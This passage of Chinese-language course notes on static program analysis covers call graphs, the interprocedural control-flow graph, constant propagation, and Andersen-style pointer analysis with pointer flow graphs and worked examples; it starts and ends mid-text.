<li>不断重复，直到没有新的方法，全遍历。</li>
</ol>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823095125945.png" alt="image-20200823095125945"></p>
<p><strong>算法</strong>：</p>
<p>m_entry=程序的入口方法</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823102314573.png" alt="image-20200823102314573"></p>
<p><strong>示例</strong>：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823105551301.png" alt="image-20200823105551301"></p>
<p>理解：</p>
<p>首先WL集合就是待处理方法，一开始WL里面就是A.main()。</p>
<p>浅色块是call site，深色块是自己类中的方法。</p>
<p>首先把main方法取出来，Resolve解它，是静态方法，只有他自己，那么连上一条调用边，目标方法A.foo()加入到WL中。</p>
<p>接着处理A.foo()方法，它里面有一个new a.bar()，那么a.bar()的目标方法就是A，B，C三个bar方法，三条边，并且这三个方法都加入到worklist里面。</p>
<p>再取A.bar()，它的目标方法就是C.bar()，也要正常加入WL里面。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823110808268.png" alt="image-20200823110808268"></p>
<p>接着是B.bar()，那么就是啥也不做。</p>
<p>最后一个是C.bar()，同样调用A.foo()，加边。</p>
<p>跳过最后的C.foo，A.foo。</p>
<h2 id="过程间控制流分析图-Interprocedural-Control-Flow-Graph-ICFG"><a href="#过程间控制流分析图-Interprocedural-Control-Flow-Graph-ICFG" class="headerlink" title="过程间控制流分析图 Interprocedural Control-Flow Graph ICFG"></a>过程间控制流分析图 Interprocedural Control-Flow Graph ICFG</h2><p><strong>定义</strong>：过程间控制流图ICFG = 各个方法自己的CFG + (Call edges + Return edges)。</p>
<ul>
<li>Call edges：连接调用点和目标函数入口</li>
<li>Return edges：从return语句连到Return site（Call site后面一条语句）</li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823112520799.png" alt="image-20200823112520799"></p>
<p><strong>说明</strong>：对ICFG进行数据流分析，<strong>目前没有标准的一套算法</strong>。</p>
<p><strong>对比</strong>：</p>
<table>
<thead>
<tr>
<th></th>
<th><strong>Intra</strong>procedural</th>
<th><strong>Inter</strong>procecdural</th>
</tr>
</thead>
<tbody><tr>
<td><strong>程序表示</strong></td>
<td>CFG</td>
<td>ICFG = CFGs + call &amp; return edges</td>
</tr>
<tr>
<td><strong>转换规则</strong></td>
<td>Node transfer</td>
<td>Node transfer + edge transfer</td>
</tr>
</tbody></table>
<p><strong>常量传播数据流分析</strong>：</p>
<ul>
<li>Node transfer：与过程内分析相同，对每个调用点，将等号左边kill掉。</li>
<li>Call edge transfer：传参</li>
<li>Return edge transfer：传返回值</li>
</ul>
<p><strong>常量传播示例</strong>：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823121139273.png" alt="image-20200823121139273"></p>
<p>理解：</p>
<p>首先也是从main方法开始，黄色代表in-flow，蓝色代表out-flow。</p>
<p>call的时候kill掉左手边变量，直接flow过去，就算有值也是return过来的。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823121556416.png" alt="image-20200823121556416"></p>
<p><strong>说明</strong>：黄色背景边必须有，从<code>b = addOne(a)</code>到<code>c=b-3</code>，a通过此边传递，b通过addOne()传递。若a也通过addOne()传递，会额外消耗系统资源。</p>
<p>在倒数第二个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">b = ten();</span><br></pre></td></tr></table></figure>

<p>需要把b在flowset中kill掉，因为b的值会在返回值里面被改掉</p>
<h1 id="08-amp-09"><a href="#08-amp-09" class="headerlink" title="08 &amp; 09"></a>08 &amp; 09</h1><p>终于来到了指针分析</p>
<p><strong>指针分析必要性</strong>：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823152109890.png" alt="image-20200823152109890"></p>
<h2 id="指针分析"><a href="#指针分析" class="headerlink" title="指针分析"></a>指针分析</h2><p><strong>目标</strong>：分析程序指针可以指向哪些内存区域。对于Java等面向对象语言，主要分析指针指向哪个对象。</p>
<p><strong>说明</strong>：<strong>指针分析属于may analysis</strong>，分析的结果是某指针所有可能指向哪些对象Object，是个over-approximation集合。</p>
<p><strong>示例</strong>：面向对象语言中的指针指向问题。对于setB()函数，this指向<code>new A()</code>，因为是调用者是a.setB()；setB()中的b是x传过来的，所以b指向new B()，A.b指向 new B()。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823153545185.png" alt="image-20200823153545185"></p>
<p><strong>区别</strong>：</p>
<ul>
<li>指针分析：分析指针所有可能指向的对象。</li>
<li>别名分析：分析两个指针是否指向相同的对象，可通过指针分析来推导得到。如果指向同一个对象，那么就是别名关系。</li>
</ul>
<p><strong>应用</strong>：基本信息（别名分析/调用图），编译优化（嵌入虚拟调用），漏洞（空指针），安全分析（信息流）。</p>
<h2 id="指针分析影响因素"><a href="#指针分析影响因素" class="headerlink" title="指针分析影响因素"></a>指针分析影响因素</h2><p><strong>指标</strong>：精度（precision）&amp; 效率（efficiency）。</p>
<p><strong>影响因素</strong>：本课程，我们主要分析分配点的堆抽象技术、上下文敏感/不敏感、流不敏感、全程序分析。</p>
<table>
<thead>
<tr>
<th>因素</th>
<th>问题</th>
<th>选项</th>
</tr>
</thead>
<tbody><tr>
<td>Heap abstraction</td>
<td>如何建模堆内存？</td>
<td>• <strong>Allocation-site</strong>        • Storeless</td>
</tr>
<tr>
<td>Context sensitivity</td>
<td>如何建模调用上下文？</td>
<td>• <strong>Context-sensitive</strong>     • <strong>Context-insensitive</strong></td>
</tr>
<tr>
<td>Flow sensitivity</td>
<td>如何建模控制流？</td>
<td>• Flow-sensitive     • <strong>Flow-insensitive</strong></td>
</tr>
<tr>
<td>Analysis scope</td>
<td>分析哪部分程序？</td>
<td>• <strong>Whole-program</strong>    • Demand-driven</td>
</tr>
</tbody></table>
<h3 id="堆抽象-Allocation-Site（内存建模）"><a href="#堆抽象-Allocation-Site（内存建模）" class="headerlink" title="堆抽象 Allocation Site（内存建模）"></a>堆抽象 Allocation Site（内存建模）</h3><p><strong>问题</strong>：程序动态执行时，堆对象个数理论上是无穷无尽的，但静态分析无法处理这个问题。所以为<strong>保证指针分析可以终止</strong>，我们采用堆抽象技术，将无穷的具体对象抽象成有限的抽象对象。也即，将有共性的对象抽象成1个静态对象，从而限制静态分析对象的个数。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823160046190.png" alt="image-20200823160046190"></p>
<p>我们只学习<code>Allocation-Site</code>技术，最常见也最常被使用。</p>
<p><strong><code>Allocation-Site</code>原理</strong>：将动态对象抽象成它们的创建点（<code>Allocation-Site</code>），来表示在该点创建的所有动态对象。<code>Allocation-Site</code>个数是有限的。</p>
<p><strong>示例</strong>：循环创建了3个对象，我们用O2来抽象表示这3个动态对象。几个new就会合并处理几个。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823160313045.png" alt="image-20200823160313045"></p>
<h3 id="上下文敏感Context-Sensitivity"><a href="#上下文敏感Context-Sensitivity" class="headerlink" title="上下文敏感Context Sensitivity"></a>上下文敏感Context Sensitivity</h3><p><strong>问题</strong>：考虑是否区分不同call-site对同一函数的调用。</p>
<ul>
<li>Context-sensitive：根据某函数调用上下文的不同，<strong>多次分析同一函数</strong>。</li>
<li>Context-insensitive：每个函数只分析一次。</li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823161014112.png" alt="image-20200823161014112"></p>
<h3 id="流敏感-Flow-Sensitivity-控制流建模"><a href="#流敏感-Flow-Sensitivity-控制流建模" class="headerlink" title="流敏感 Flow Sensitivity 控制流建模"></a>流敏感 Flow Sensitivity 控制流建模</h3><p><strong>问题</strong>：考虑语句顺序（控制流）的影响  vs 把程序当做无序语句的集合。</p>
<p><strong>方法</strong>：流敏感会在<strong>每个程序点</strong>都保存一份<strong>指针指向关系映射表</strong>，而流不敏感则对整个程序保存一份指向关系映射。</p>
<p><strong>说明</strong>：目前流敏感对Java提升不大，不过在C中很有效，本课程分析的是Java，所以Java重点讨论流不敏感技术。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823161210004.png" alt="image-20200823161210004"></p>
<p><strong>指针分析示例</strong>：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823164736418.png" alt="image-20200823164736418"></p>
<h3 id="分析范围-Analysis-Scope"><a href="#分析范围-Analysis-Scope" class="headerlink" title="分析范围 Analysis Scope"></a>分析范围 Analysis Scope</h3><p><strong>问题</strong>：分析程序的哪一部分？</p>
<ul>
<li>Whole-program 全程序：分析全程序的指向关系。</li>
<li>Demand-driven 需求驱动：只分析影响特定域的指针的指向关系。会很耗费资源。</li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823164722791.png" alt="image-20200823164722791"></p>
<h2 id="分析语句种类"><a href="#分析语句种类" class="headerlink" title="分析语句种类"></a>分析语句种类</h2><p><strong>问题</strong>：哪些语句会影响指针指向，那就只分析这些语句。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823170535943.png" alt="image-20200823170535943"></p>
<p><strong>Java指针类型</strong>：</p>
<ol>
<li><strong>Lacal variable: x</strong></li>
<li>Static field:C.f   （有时称为全局变量）——不分析</li>
<li><strong>Instance field: x.f</strong>    对象的field 把他们的组合看成是一个pointer object</li>
<li>Array element: array[i]  ——不分析，因为静态分析无法确定下标，所以将array中所有成员映射到一个field中，等价于<strong>Instance field</strong>，所以不重复分析。如下图所示：</li>
</ol>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823170722727.png" alt="image-20200823170722727"></p>
<p><strong>影响指针指向的语句</strong>：</p>
<ol>
<li>New:      x = new T()</li>
<li>Assign：x = y</li>
<li>Store：  x.f = y</li>
<li>Load：   y = x.f</li>
<li>Call：     r = x.k(a,…)<ul>
<li>Static call：    C.foo()</li>
<li>Special call： super.foo() / x.<init>() / this.privateFoo()</init></li>
<li><strong>Virtual call</strong>：x.foo()</li>
</ul>
</li>
</ol>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823171047905.png" alt="image-20200823171047905"></p>
<h2 id="指针分析规则"><a href="#指针分析规则" class="headerlink" title="指针分析规则"></a>指针分析规则</h2><p><strong>首先分析前4种语句</strong>：New / Assign / Store / Load。</p>
<p><strong>指针分析的域和相应的记法</strong>：变量/函数/对象/实例域/指针，用pt表示程序中的指向关系（映射）。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200823222852548.png" alt="image-20200823222852548"></p>
<p>理解：</p>
<p>指针Pointers，指的就是两部分：</p>
<ol>
<li>程序内部所有变量V</li>
<li>实例对象的属性域O X F</li>
</ol>
<p>这里面P(O)指的是对象的幂集；</p>
<p>pt(p)表示p点的指针集。</p>
<p>这里可以把Points-to relations理解为Map就是映射，Key就是指针，Value就是指针指针集。</p>
<p><strong>规则</strong>：采用推导形式，横线上面是条件，横线下面是结论。</p>
<ul>
<li>New：创建对象，将<code>new T()</code>对应的对象oi加入到x的指针集。</li>
<li>Assign：将y的指针集加入到x对应的指针集。</li>
<li>Store：让oi的field指向oj。</li>
<li>Load：Store的反操作。</li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824003804482.png" alt="image-20200824003804482"></p>
<h2 id="指针分析实现方式"><a href="#指针分析实现方式" class="headerlink" title="指针分析实现方式"></a>指针分析实现方式</h2><p><strong>算法要求</strong>：全程序指针分析，要容易理解和实现。</p>
<p><strong>本质</strong>：在指针（变量/域）之间传递指向信息。Andersen-style分析（很普遍）——很多solving system把指针分析看作是一种包含关系，eg，<code>x = y</code>，x包含y。</p>
<p><strong>问题</strong>：当一个指针的指向集发生变化，必须更新与它相关的其他指针。如何表示这种传递关系？答案PFG。</p>
<p><strong>PFG</strong>：用指针流图PFG来表示指针之间的关系，PFG是<strong>有向图</strong>。</p>
<ul>
<li>Nodes：Pointer = V U (O x F)    节点n表示一个变量或抽象对象的域。</li>
<li>Edges：Pointer X Pointer   边x -&gt; y 表示指针x指向的对象may会流入指针y。</li>
</ul>
<p><strong>Edges添加规则</strong>：根据程序语句 + 对应的规则。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824132635446.png" alt="image-20200824132635446"></p>
<p><strong>示例</strong>：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824135220028.png" alt="image-20200824135220028"></p>
<p><strong>指针分析PTA方法</strong>：</p>
<ol>
<li>构造PFG，PFG也受指向关系的影响。</li>
<li>根据PFG传播指向信息。</li>
</ol>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824135336802.png" alt="image-20200824135336802"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824135532341.png" alt="image-20200824135532341"></p>
<h2 id="指针分析算法"><a href="#指针分析算法" class="headerlink" title="指针分析算法"></a>指针分析算法</h2><h3 id="过程内PTA算法"><a href="#过程内PTA算法" class="headerlink" title="过程内PTA算法"></a>过程内PTA算法</h3><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824140017899.png" alt="image-20200824140017899"></p>
<p><strong>符号</strong>：</p>
<ul>
<li>S：程序语句的集合。</li>
<li>WL：Work list，待合并的指针信息，二元组的集合，<strong>&lt;指针n，指向的对象集合pts&gt;</strong>。pts将被加入到n的指向集pt(n)中。</li>
<li>PFG：指针流图，边的集合。</li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824140118428.png" alt="image-20200824140118428"></p>
<p>理解：</p>
<p>强化一下AddEdge算法：</p>
<p>AddEdge(s，t)的意思就是如果PFG里面没有，那么就新增一条s-&gt;t的边，</p>
<p>接下来不要忘了指向信息的传播，如果<strong>s的指针集里面还有东西</strong>，那么也要把s指针集里面的东西让t也能指到。也就是新增&lt;t,pt(s)&gt;到WorkList集合里面。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">s = t ;</span><br><span class="line">指向：-----&gt;</span><br><span class="line">流向：&lt;-----</span><br></pre></td></tr></table></figure>

<p>对于上面这个语句：</p>
<p>s是指针，s指向了t，那么t属于pt(s)，pt(s)={t};</p>
<p>也可以理解为pt(t)指针集里面的东西向左流给了pt(s)，这里如果pt(t)里有东西，那么也要向左流给s，也就是pt(s)={pt(t)};</p>
<p>Oi.f可能会被别的变量指向</p>
<p>强化理解一下Propagate算法：</p>
<p>如果pts不是空集，那么就是把增量加入到ptn。</p>
<p>接下来还要把新的指针集都改了，继续传播下去。</p>
<p>取出所有的n指向的边，也就是n的后继s，将&lt;s,pts&gt;加入到WL中，这里其实就是将指向信息传递给同名指针。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210408170110240.png" alt="image-20210408170110240"></p>
<h3 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h3><p>流不敏感指针分析</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824151533801.png" alt="image-20200824151533801"></p>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="center">WL</th>
<th align="center">正处理</th>
<th align="center">PFG</th>
<th>指针集</th>
<th>处理语句</th>
<th>算法语句</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">[&lt;b, {o1}&gt;, &lt;c, {o3}&gt;]</td>
<td align="center"></td>
<td align="center"></td>
<td></td>
<td>1，3</td>
<td>处理New</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">[&lt;b, {o1}&gt;, &lt;c, {o3}&gt;]</td>
<td align="center"></td>
<td align="center">a &lt;- b；d &lt;- c；</td>
<td></td>
<td>2，4</td>
<td>处理Assign</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">[&lt;c, {o3}&gt;]</td>
<td align="center">&lt;b, {o1}&gt;</td>
<td align="center">a &lt;- b；d &lt;- c；</td>
<td>pt(b)={o1}</td>
<td></td>
<td>while开头</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">[&lt;c, {o3}&gt;], [&lt;a, {o1}&gt;]</td>
<td align="center"></td>
<td align="center">a &lt;- b；d &lt;- c；</td>
<td></td>
<td></td>
<td>Propagate()传递，没有b.f语句</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">[&lt;a, {o1}&gt;]</td>
<td align="center">&lt;c, {o3}&gt;</td>
<td align="center">a &lt;- b；d &lt;- c；</td>
<td>pt(c)={o3}</td>
<td></td>
<td>while开头</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">[&lt;a, {o1}&gt;, &lt;d, {o3}&gt;]</td>
<td align="center"></td>
<td align="center">a &lt;- b；d &lt;- c；</td>
<td></td>
<td></td>
<td>Propagate()传递，有c.f语句</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">[&lt;a, {o1}&gt;, &lt;d, {o3}&gt;]</td>
<td align="center"></td>
<td align="center">a &lt;- b；d &lt;- c；o3.f &lt;- a；o3.f &lt;- d；<img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824151918157.png" alt="image-20200824151918157"></td>
<td></td>
<td>4，6</td>
<td>处理Store/Load，添加边</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">[&lt;d, {o3}&gt;]</td>
<td align="center">&lt;a, {o1}&gt;</td>
<td align="center"></td>
<td>pt(a)={o1}；</td>
<td></td>
<td>while开头</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">[&lt;d, {o3}&gt;,&lt;o3.f, {o1}&gt;]</td>
<td align="center"></td>
<td align="center"><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824152807239.png" alt="image-20200824152807239"></td>
<td></td>
<td></td>
<td>Propagate()传递</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">[&lt;o3.f, {o1}&gt;]</td>
<td align="center">&lt;d, {o3}&gt;</td>
<td align="center"></td>
<td>pt(d)={o3}</td>
<td></td>
<td>while开头</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">[&lt;o3.f, {o1}&gt;, &lt;o3.f, {o3}&gt;]</td>
<td align="center"></td>
<td align="center"><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824152953917.png" alt="image-20200824152953917"></td>
<td></td>
<td></td>
<td>Propagate()传递，有d.f语句</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center">[&lt;o3.f, {o1}&gt;, &lt;o3.f, {o3}&gt;]</td>
<td align="center"></td>
<td align="center">a&lt;-b；d&lt;-c；o3.f&lt;-a；o3.f&lt;-d；e&lt;-o3.f；<img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824153253589.png" alt="image-20200824153253589"></td>
<td></td>
<td>7</td>
<td>处理Load，添加边</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center">[&lt;o3.f, {o3}&gt;]</td>
<td align="center">&lt;o3.f, {o1}&gt;</td>
<td align="center"></td>
<td>pt(o3.f)={o1}；</td>
<td></td>
<td>while开头</td>
</tr>
<tr>
<td align="center">14</td>
<td align="center">[&lt;o3.f, {o3}&gt;, &lt;e, {o1}&gt;]</td>
<td align="center"></td>
<td align="center"><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824153518243.png" alt="image-20200824153518243"></td>
<td></td>
<td></td>
<td>Propagate()传递</td>
</tr>
<tr>
<td align="center">15</td>
<td align="center">[&lt;e, {o1}&gt;]</td>
<td align="center">&lt;o3.f, {o3}&gt;</td>
<td align="center"></td>
<td>pt(o3.f)={o1, o3}</td>
<td></td>
<td>while开头</td>
</tr>
<tr>
<td align="center">16</td>
<td align="center">[&lt;e, {o1}&gt;, &lt;e, {o3}&gt;]</td>
<td align="center"></td>
<td align="center"><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824153533320.png" alt="image-20200824153533320"></td>
<td></td>
<td></td>
<td>Propagate()传递</td>
</tr>
<tr>
<td align="center">17</td>
<td align="center"></td>
<td align="center">&lt;e, {o1}&gt;；&lt;e, {o3}&gt;</td>
<td align="center"><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824153621112.png" alt="image-20200824153621112"></td>
<td>pt(e)={o1, o3}</td>
<td></td>
<td>while开头</td>
</tr>
</tbody></table>
<hr>
<p>课后总结：</p>
<p>有人提问：流敏感指针分析有什么区别？</p>
<p>TT答：流敏感指针分析是在程序的特定运行位置维护一个指针集，对于Java来说开销极大并且benifit不明显，所以<strong>在Java业界主要还是流不敏感的指针分析</strong>。<strong>如果提升精度，主要选择上下文敏感的指针分析</strong>。</p>
<p>上述算法和WALA的实现比较像。</p>
<h1 id="10"><a href="#10" class="headerlink" title="10"></a>10</h1><h2 id="指针分析处理函数调用"><a href="#指针分析处理函数调用" class="headerlink" title="指针分析处理函数调用"></a>指针分析处理函数调用</h2><p><strong>构造调用图技术对比</strong>：</p>
<ul>
<li>CHA：基于声明类型，不精确，引入错误的调用边和指针关系。</li>
<li>指针分析：基于pt(a)，即a指向的类型，更精确，构造更准的CG并对指针分析有正反馈（所以过程间指针分析和CG构造同时进行，很复杂）。aka. <code>on-the-fly</code> call-graph construction</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(A a)</span> </span>&#123;   </span><br><span class="line">  <span class="comment">// pt(a) = ???</span></span><br><span class="line">  ...</span><br><span class="line">    b = a.bar();    </span><br><span class="line">  <span class="comment">// pt(b) = ???  把a的指向分析清楚了，就能确定a.bar()到底调用哪个对象的bar()函数，那么b的指向也明确了。</span></span><br><span class="line">    ... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Call调用语句规则"><a href="#Call调用语句规则" class="headerlink" title="Call调用语句规则"></a>Call调用语句规则</h3><p><strong>call语句规则</strong>：主要分为4步。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200824215741366.png" alt="image-20200824215741366"></p>
<ol>
<li><strong>找目标函数m</strong>：Dispatch(oi, k)——找出pt(x)，也即oi类型对象中的k函数。</li>
<li><strong>receiver object</strong>：把x指向的对象（<code>pt(x)</code>）传到m函数的this变量，即mthis</li>
<li><strong>传参数</strong>：pt(aj), 1&lt;=j&lt;=n  传给m函数，即p(mpj), 1&lt;=j&lt;=n。<strong>建立PFG边</strong>，a1-&gt;mp1，…，an-&gt;mpn。</li>
<li><strong>传返回值</strong>：pt(mret)传给pt(r)。<strong>建立PFG边</strong>，r &lt;- mret。</li>
</ol>
<p><strong>问题</strong>：为什么PFG中不添加x-&gt;mthis边？</p>
<p><strong>答</strong>：因为this只和自己这个对象相关，而可能有pt(x)={new A, new B, new C}，</p>
